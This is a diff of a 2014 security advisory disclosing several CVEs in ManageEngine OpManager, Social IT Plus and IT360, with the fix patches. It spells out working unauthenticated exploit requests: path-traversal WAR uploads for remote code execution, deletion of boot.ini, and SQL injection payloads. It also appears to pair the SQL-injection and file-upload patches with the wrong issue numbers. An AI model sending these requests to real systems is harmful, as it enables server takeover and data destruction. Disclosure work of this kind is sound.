@@ -1,7 +1,7 @@
 >> Multiple vulnerabilities in ManageEngine OpManager, Social IT Plus and IT360
 >> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
 ==========================================================================
-Disclosure: 27/09/2014 / Last updated: 12/10/2014
+Disclosure: 27/09/2014 (#1 and #2), 09/11/2014 (#3 and #4) / Last updated: 09/11/2014
 
 >> Background on the affected products:
 "ManageEngine OpManager is a network and data center infrastructure management software that helps large enterprises, service providers and SMEs manage their data centers and IT infrastructure efficiently and cost effectively. Automated workflows, intelligent alerting engines, configurable discovery rules, and extendable templates enable IT teams to setup a 24x7 monitoring system within hours of installation."
@@ -19,25 +19,64 @@ Constraints: unauthenticated on OpManager and Social IT; authenticated in IT360
 a)
 CVE-2014-6034
 POST /servlet/com.me.opmanager.extranet.remote.communication.fw.fe.FileCollector?regionID=../../../tomcat/webapps&FILENAME=payload.war
-Affected versions: OpManager v8.8 to v11.3; Social IT Plus v11.0; IT360 v? to v10.4
+Affected versions: OpManager v8.8 to v11.4; Social IT Plus v11.0; IT360 v? to v10.4
 A Metasploit module that exploits this vulnerability has been released.
 
 b)
 CVE-2014-6035
 POST /servlets/FileCollector?AGENTKEY=123&FILENAME=../../../tomcat/webapps/warfile.war
-Affected versions: OpManager v? to v11.3
+Affected versions: OpManager v? to v11.4
 
 
 #2
 Vulnerability: Arbitrary file deletion
 CVE-2014-6036
 Constraints: unauthenticated on OpManager and Social IT; authenticated in IT360
-Affected versions: OpManager v? to v11.3; Social IT Plus v11.0; IT360 v? to v10.4
+Affected versions: OpManager v? to v11.4; Social IT Plus v11.0; IT360 v? to v10.3/10.4
 
 POST /servlets/multipartRequest?customIcon=delete&fileName=../../../../boot.ini
 
 
+#3
+Vulnerability: Remote code execution via file upload (unauthenticated on OpManager and Social IT)
+CVE-2014-7866
+Constraints: no authentication needed for OpManager and Social IT; authenticated in IT360
+
+a)
+POST /servlet/MigrateLEEData?fileName=../tomcat/webapps/warfile.war%00
+Affected versions: Unknown, at least OpManager v8 build 88XX to 11.4; IT360 10.3/10.4; Social IT 11.0
+
+b)
+POST /servlet/MigrateCentralData?operation=downloadFileFromProbe&zipFileName=../tomcat/webapps/warfile.war%00
+Affected versions: Unknown, at least OpManager v8 build 88XX to 11.4; IT360 10.3/10.4; Social IT 11.0
+
+
+#4
+Vulnerability: Blind SQL injection (unauthenticated)
+CVE-2014-7868
+Constraints: no authentication needed for OpManager and Social IT; authenticated in IT360
+
+a)
+POST /servlet/APMBVHandler?OPERATION_TYPE=Delete&OPM_BVNAME=[SQLi]
+POST /servlet/APMBVHandler?OPERATION_TYPE=Delete&OPM_BVNAME=aaa'%3bcreate+table+pulicia+(bolas+text)%3b--+
+Affected versions: Unknown, at least the current versions (OpManager 11.3/11.4; IT360 10.3/10.4; Social IT 11.0)
+
+b)
+POST /servlet/DataComparisonServlet?operation=compare&numPrimaryKey=1337&query=[SQLi]  --> runs direct query in db!
+POST /servlet/DataComparisonServlet?operation=compare&numPrimaryKey=1337&query=create+table+panicia+(bolos+text)
+Affected versions: Unknown, at least the current versions (OpManager 11.3/11.4; IT360 10.3/10.4; Social IT 11.0)
+
+
 >> Fix:
-Upgrade to OpManager 11.3, then install the patch in https://support.zoho.com/portal/manageengine/helpcenter/articles/servlet-vulnerability-fix
-This patch can be applied to all the applications but only for the latest version of each (OpManager 11.3, Social IT 11.0, IT360 10.4).
-ManageEngine have indicated that the soon to be released OpManager version 11.4 might not have the fix as the release is almost ready. They are planning to include the fix in OpManager version 11.5 which should be released sometime in late November or December 2014. No indication was given for when fixed versions of IT360 and Social IT Plus will be released.
+Upgrade to OpManager 11.3 or 11.4, then install patches [A], [B] and [C].
+This patch can be applied to all the applications but only for the latest version of each (OpManager 11.3/11.4, Social IT 11.0, IT360 10.4).
+The fix will be included in OpManager version 11.5 which should be released sometime in late November or December 2014. No indication was given for when fixed versions of IT360 and Social IT Plus will be released.
+
+[A] https://support.zoho.com/portal/manageengine/helpcenter/articles/servlet-vulnerability-fix
+Resolves #1 and #2
+
+[B] https://support.zoho.com/portal/manageengine/helpcenter/articles/sql-injection-vulnerability-fix
+Resolves #3
+
+[C] https://support.zoho.com/portal/manageengine/helpcenter/articles/fix-for-remote-code-execution-via-file-upload-vulnerability
+Resolves #4
